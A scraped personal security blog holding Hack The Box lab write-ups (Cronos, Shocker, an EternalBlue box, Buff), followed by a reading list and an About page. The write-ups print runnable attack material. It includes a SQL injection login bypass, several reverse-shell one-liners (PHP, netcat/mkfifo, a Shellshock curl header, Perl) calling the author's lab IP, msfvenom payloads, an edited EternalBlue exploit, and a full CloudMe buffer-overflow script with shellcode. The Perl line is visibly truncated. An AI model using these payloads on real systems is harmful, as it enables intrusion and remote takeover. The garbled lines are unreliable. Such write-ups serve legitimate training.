title: Cronos
content:
This is a good box. Not too hard, requires thinking, good training.
Enumeration     Starting with an nmap scan…
Nmap    Nmap full scan
# Nmap 7.91 scan initiated Wed Jan 6 23:45:54 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /results/scans/nmap/full_tcp_nmap.txt -oX /results/scans/xml/full_tcp_nmap.xml 10.10.10.13 Nmap scan report for 10.10.10.13 Host is up, received user-set (0.14s latency). Scanned at 2021-01-06 23:45:54 UTC for 240s Not shown: 65532 filtered ports Reason: 65532 no-responses PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | ssh-rsa  | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ= | 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx 53/tcp open domain syn-ack ttl 62 ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%), Linux 4.2 (91%), Linux 4.4 (91%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.91%E=4%D=1/6%OT=22%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=5FF64CA2%P=x86_64-pc-linux-gnu) SEQ(SP=105%GCD=1%ISR=10C%TI=Z%TS=8) OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11) WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120) ECN(R=Y%DF=Y%TG=40%W=7210%O=M54DNNSNW7%CC=Y%Q=) T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) U1(R=N) IE(R=Y%DFI=N%TG=40%CD=S) Uptime guess: 0.214 days (since Wed Jan 6 18:41:04 2021) Network Distance: 3 hops TCP Sequence Prediction: Difficulty=260 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 0.10 ms 172.17.0.1 2 139.63 ms 10.10.14.1 3 139.89 ms 10.10.10.13 Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 6 23:49:54 2021 -- 1 IP address (1 host up) scanned in 240.72 seconds Nmap UDP scan
# Nmap 7.91 scan initiated Wed Jan 6 23:45:54 2021 as: nmap -vv --reason -Pn -sU -A --top-ports=20 --version-all -oN /results/scans/nmap/top_20_udp_nmap.txt -oX /results/scans/xml/top_20_udp_nmap.xml 10.10.10.13 Nmap scan report for 10.10.10.13 Host is up, received user-set (0.14s latency). Scanned at 2021-01-06 23:45:54 UTC for 519s PORT STATE SERVICE REASON VERSION 53/udp open domain udp-response ttl 62 ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 67/udp open|filtered dhcps no-response 68/udp open|filtered dhcpc no-response 69/udp open|filtered tftp no-response 123/udp open|filtered ntp no-response 135/udp open|filtered msrpc no-response 137/udp open|filtered netbios-ns no-response 138/udp open|filtered netbios-dgm no-response 139/udp open|filtered netbios-ssn no-response 161/udp open|filtered snmp no-response 162/udp open|filtered snmptrap no-response 445/udp open|filtered microsoft-ds no-response 500/udp open|filtered isakmp no-response 514/udp open|filtered syslog no-response 520/udp open|filtered route no-response 631/udp open|filtered ipp no-response 1434/udp open|filtered ms-sql-m no-response 1900/udp open|filtered upnp no-response 4500/udp open|filtered nat-t-ike no-response 49152/udp open|filtered unknown no-response Too many fingerprints match this host to give specific OS details TCP/IP fingerprint: SCAN(V=7.91%E=4%D=1/6%OT=%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=5FF64DB9%P=x86_64-pc-linux-gnu) SEQ(II=I) U1(R=N) IE(R=Y%DFI=N%TG=40%CD=S) Network Distance: 3 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 53/udp) HOP RTT ADDRESS 1 0.06 ms 172.17.0.1 2 139.12 ms 10.10.14.1 3 139.81 ms 10.10.10.13 Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 6 23:54:33 2021 -- 1 IP address (1 host up) scanned in 519.71 seconds DNS    Lets resolve the machines hostname Seeing DNS over TCP means we can attempt Zone transfer
dig axfr cronos.htb @10.10.10.13 HTTP    Browsing regularly to http://10.10.10.13 Browsing with the admin.cronos.htb Host header Authentication Bypass via SQLi in the login form
Username: admin' -- - Password: blah https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
Brings up to a utility ripe for command injection
8.8.8.8; php -r '$sock=fsockopen("10.10.14.29",8080);exec("/bin/sh -i <&3 >&3 2>&3");' catching the reverse shell with nc User Flag     upgrade shell
python -c 'import pty;pty.spawn("/bin/bash")' ^Z (background shell) echo $TERM stty -a stty raw -echo; fg<enter><enter> stty rows XXX columns XXX export TERM="xterm-256color" reset Get user.txt
cat /home/noulis/user.txt && ifconfig Root Flag     running linpeas.sh shows an interesting cron job seeing the artisan.php file is run every minute (* * * * *), we can edit artisan with a malicious php reverse shell
It must be wrapped in php tags
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 4444 >/tmp/f');?> Get root.txt
cat /root/root.txt && ifconfig

title: Shocker
content:
Shellshock…duh.
Enumeration     Starting with an nmap scan…
Nmap    # Nmap 7.91 scan initiated Tue Jan 5 00:08:34 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /results/scans/nmap/full_tcp_nmap.txt -oX /results/scans/xml/full_tcp_nmap.xml 10.10.10.56 adjust_timeouts2: packet supposedly had rtt of -118931 microseconds. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 5 00:13:02 2021 -- 1 IP address (1 host up) scanned in 268.04 seconds HTTP    gobuster dir -u http://10.10.10.56:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp" -o "/results/scans/recon/tcp_80_http_gobuster.txt" /.hta (Status: 403) [Size: 290] /.hta.aspx (Status: 403) [Size: 295] /.hta.jsp (Status: 403) [Size: 294] /.hta.txt (Status: 403) [Size: 294] /.hta.html (Status: 403) [Size: 295] /.hta.php (Status: 403) [Size: 294] /.hta.asp (Status: 403) [Size: 294] /.htpasswd (Status: 403) [Size: 295] /.htpasswd.txt (Status: 403) [Size: 299] /.htpasswd.html (Status: 403) [Size: 300] /.htpasswd.php (Status: 403) [Size: 299] /.htpasswd.asp (Status: 403) [Size: 299] /.htpasswd.aspx (Status: 403) [Size: 300] /.htpasswd.jsp (Status: 403) [Size: 299] /.htaccess (Status: 403) [Size: 295] /.htaccess.txt (Status: 403) [Size: 299] /.htaccess.html (Status: 403) [Size: 300] /.htaccess.php (Status: 403) [Size: 299] /.htaccess.asp (Status: 403) [Size: 299] /.htaccess.aspx (Status: 403) [Size: 300] /.htaccess.jsp (Status: 403) [Size: 299] /cgi-bin/ (Status: 403) [Size: 294] /cgi-bin/.html (Status: 403) [Size: 299] /index.html (Status: 200) [Size: 137] /index.html (Status: 200) [Size: 137] /server-status (Status: 403) [Size: 299] gobuster dir -u http://10.10.10.56:80/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "sh,pl,php,bat" -o ../scans/recon/tcp_80_gobuster_cgi-bin.txt shows us user.sh
User Flag     exploiting shellshock with curl
curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.29/8080 0>&1' http://shocker.htb/cgi-bin/user.sh catch reverse shell with nc
sudo nc -lvp 8080 Get user.txt
cat /home/shelly/user.txt && ipconfig Root Flag     sudo -l showed the ability to run perl as root
sudo perl -e 'use Socket;$i="10.10.14.29";$p=9999;socket(S,PF_INET,SOCK_STREAM>&S");exec("/bin/sh -i");};' Get root.txt
cat /root/root.txt && ifconfig

Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jan 2 01:45:55 2021 -- 1 IP address (1 host up) scanned in 135.54 seconds User Flag     searchsploit ms17-010 Exploit code: https://www.exploit-db.com/exploits/42315
Modify smb_pwn function
comment out
#print('creating file c:\\pwned.txt on the target') #tid2 = smbConn.connectTree('C$') #fid2 = smbConn.createFile(tid2, '/pwned.txt') #smbConn.closeFile(tid2, fid2) #smbConn.disconnectTree(tid2) Add
service_exec(conn, r'cmd /c \\10.10.14.29\PWN\1.exe') Generate TCP reverse shell with msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=443 -f exe > 1.exe host payload over SMB
sudo python3 impacket/examples/smbserver.py PWN .	Run exploit
python eternalblue.py 10.10.10.4 catch reverse shell with nc
sudo nc -lvp 443 Get user.txt
type "C:\Documents and Settings\john\Desktop\user.txt" && ipconfig Root Flag     Get root.txt
type "C:\Documents and Settings\Administrator\Desktop\root.txt" && ipconfig

title: Buff
content:
Buff is an unconvential Windows box. Not your usual Kerberos, LDAP, SMB, etc. Chisel is much better than plink. Think smarter not harder. Read exploit details carefully
Enumeration     Nmap    Starting with an nmap scan…
~ » nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.198 Nmap scan report for 10.10.10.198 Host is up, received user-set (0.13s latency). Scanned at 2020-10-12 22:10:53 UTC for 599s Not shown: 65533 filtered ports Reason: 65533 no-responses PORT STATE SERVICE REASON VERSION 7680/tcp open pando-pub? syn-ack ttl 126 8080/tcp open http syn-ack ttl 126 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n's Bro Hut Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: specialized|general purpose Running (JUST GUESSING): AVtech embedded (85%), FreeBSD 6.X|10.X (85%), Apple Mac OS X 10.5.X (85%) OS CPE: cpe:/o:freebsd:freebsd:6.2 cpe:/o:apple:mac_os_x:10.5.8 cpe:/o:freebsd:freebsd:10.3 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (85%), FreeBSD 6.2-RELEASE (85%), Apple Mac OS X 10.5.8 (Leopard) (Darwin 9.8.0) (85%), FreeBSD 10.3-STABLE (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 3 hops TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: Busy server or unknown class TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 0.05 ms 172.17.0.1 2 61.14 ms 10.10.14.1 3 186.69 ms 10.10.10.198 Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Oct 12 22:20:52 2020 -- 1 IP address (1 host up) scanned in 599.65 seconds HTTP    Browsing to 8080:
On the contact page:
User Flag     Believe it or not, “Gym Management System 1.0” is some actual software. Searching searchsploit for “Gym Management System” we see:
Looking at the exploit details: “Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.”
Running the exploit:
We then upload nc.exe and send a reverse shell back to our attacking machine:
Looking through Shaun’s home directory we get the user flag:
Root Flag     Looking through Shaun’s Downloads directory, we see an executable called CloudMe_1112.exe:
searching for an exploit for that binary:
We simply try to fist one 48389.py. This exploit requires the CloudMe service to be listening on localhost:8888 so we start the service by executing the CloudMe binary: .\CloudMe_1112.exe
Rather than trying to build the python script into an executable and executing it on the windows machine (which I did try, but it was tedious), we can upload something like chisel or plink.exe to create a reverse port forward back to the attacking machine. This allows us to run the python script locally and tunnel the output to the victim machines port 8888.
Executing chisel client on Buff
.\c.exe client 10.10.14.17:8889 R:8888:localhost:8888
Executing the chisel server on Kali:
./chisel_1.7.0_linux_amd64 server -p 8889 --reverse
Building the shellcode to send a nc shell back:
msfvenom -a x86 -p windows/exec CMD="C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.17 5555" -b '\x00\x0A\x0D' -f python -v payload
Inserting the shellcode into the python script:
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC) # Date: 2020-04-27 # Exploit Author: Andy Bowden # Vendor Homepage: https://www.cloudme.com/en # Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe # Version: CloudMe 1.11.2 # Tested on: Windows 10 x86 #Instructions: # Start the CloudMe service and run the script. import socket target = "127.0.0.1" padding1 = b"\x90" * 1052 EIP = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET NOPS = b"\x90" * 30 #msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python payload = b"" payload += b"\xb8\x04\xe2\x7d\x82\xdb\xde\xd9\x74\x24\xf4\x5f" payload += b"\x2b\xc9\xb1\x3e\x83\xef\xfc\x31\x47\x10\x03\x47" payload += b"\x10\xe6\x17\x81\x6a\x64\xd7\x7a\x6b\x08\x51\x9f" payload += b"\x5a\x08\x05\xeb\xcd\xb8\x4d\xb9\xe1\x33\x03\x2a" payload += b"\x71\x31\x8c\x5d\x32\xff\xea\x50\xc3\x53\xce\xf3" payload += b"\x47\xa9\x03\xd4\x76\x62\x56\x15\xbe\x9e\x9b\x47" payload += b"\x17\xd5\x0e\x78\x1c\xa3\x92\xf3\x6e\x22\x93\xe0" payload += b"\x27\x45\xb2\xb6\x3c\x1c\x14\x38\x90\x15\x1d\x22" payload += b"\xf5\x13\xd7\xd9\xcd\xe8\xe6\x0b\x1c\x11\x44\x72" payload += b"\x90\xe0\x94\xb2\x17\x1a\xe3\xca\x6b\xa7\xf4\x08" payload += b"\x11\x73\x70\x8b\xb1\xf0\x22\x77\x43\xd5\xb5\xfc" payload += b"\x4f\x92\xb2\x5b\x4c\x25\x16\xd0\x68\xae\x99\x37" payload += b"\xf9\xf4\xbd\x93\xa1\xaf\xdc\x82\x0f\x1e\xe0\xd5" payload += b"\xef\xff\x44\x9d\x02\x14\xf5\xfc\x48\xeb\x8b\x7a" payload += b"\x3e\xeb\x93\x84\x6f\x83\xa2\x0f\xe0\xd4\x3a\xda" payload += b"\x44\x2a\x71\x47\xec\xa2\xdc\x1d\xac\xaf\xde\xcb" payload += b"\xf3\xc9\x5c\xfe\x8b\x2e\x7c\x8b\x8e\x6b\x3a\x67" payload += b"\xe3\xe4\xaf\x87\x50\x05\xfa\xcb\x6c\xa5\x7d\xad" payload += b"\xfd\x25\x0e\x71\x96\xb1\x8a\xe6\x05\x4a\x0f\x9e" payload += b"\xb0\xc1\xf3\x15\x33\x75\x63\xb7\xd7\xd9\x15\x54" payload += b"\x36\x84\x91\xff\x66\x6b\x07\x20\x04\x1e\xa3\x0e" payload += b"\xaf\x98\x4e\x6f\x1e\x68\xbf\x5e\x50\xa6\x8e\x95" payload += b"\xbe\x84\xc9\xf5\x8b\xdd\x1c\xc3\xf3" overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + payload)) buf = padding1 + EIP + NOPS + payload + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,8888)) s.send(buf) except Exception as e: print(sys.exc_value) Executing CloudMe exploit at catching the reverse shell:
Then we grab root flag:

title: Lame
Recommendations
content:
These are some of my favorite books, podcasts, blogs, news sites, and more! This is not a complete list, and will be continually updated.
 Books     Attacking Network Protocols - James Forshaw Real-World Bug Hunting - Peter Yaworski Hacking Exposed 7 - Stuart McClure / Joel Scambray / George Kurtz Practical Malware Analysis - Michael Sikorski / Andrew Honig Hacking: The Art of Exploitation - Jon Erickson The Hacker Playbook 3 - Peter Kim Hash Crack: Password Cracking Manual (v3) - Joshua Picolet Red Team Field Manual - Ben Clark Crypto 101 - Laurens Van Houtven BulletProof SSL and TLS - Ivan Ristić Windows Internals I - Pavel Yosifovich Windows Internals II - Pavel Yosifovich Black Hat Python - Justin Seitz Black Hat Go - Tom Steele / Chris Patten / Dan Kottmann   Podcasts     Risky Business - Patrick Gray / Adam Boileau Darknet Diaries - Jack Rhysider   Training     Hack The Box OverTheWire Vulnhub PortSwigger WebSecurity Academy DetectionLab JuiceShop   Research Blogs     MalwareUnicorn Azeria Labs ADSecurity Daniel Miessler Schneier On Security   News     Slashdot BleepingComputer US-CERT Hacker News   Conference Talks     Weaponizing Your Pets: The War Kitteh and the Denial of Service Dog - Gene Bransfield HAKC THE POLICE - Bill Swearingen Jackpotting Automated Teller Machines Redux - Barnaby Jack Pwned By The Owner: What Happens When You Steal A Hacker’s Computer - Zoz Steal Everything, Kill Everyone, Cause Total Financial Ruin! - Jayson E. Street Flying a False Flag: Advanced C2, Trust Conflicts, and Domain Takeover - Nick Landers

title: About
content:
Hi there    I’m Ian (@m1thryn). Security enthusiast, tinkerer, wanna-be hacker. I run this blog as an outlet for research, a place to store ctf notes, and a way to continue learning.
Interested in offensive security.
Contact Me:
 Twitter  Github  Email   GPG    $ gpg --fingerprint --list-keys gpg@ianmckay.33mail.com pub rsa4096 2020-06-21 [SC] E08D 4AAE B48D 92CA EF88 C271 4124 4D04 2615 4CFC uid [ultimate] Ian Mckay <gpg@ianmckay.33mail.com> sub rsa4096 2020-06-21 [E] sub rsa4096 2020-06-21 [S]
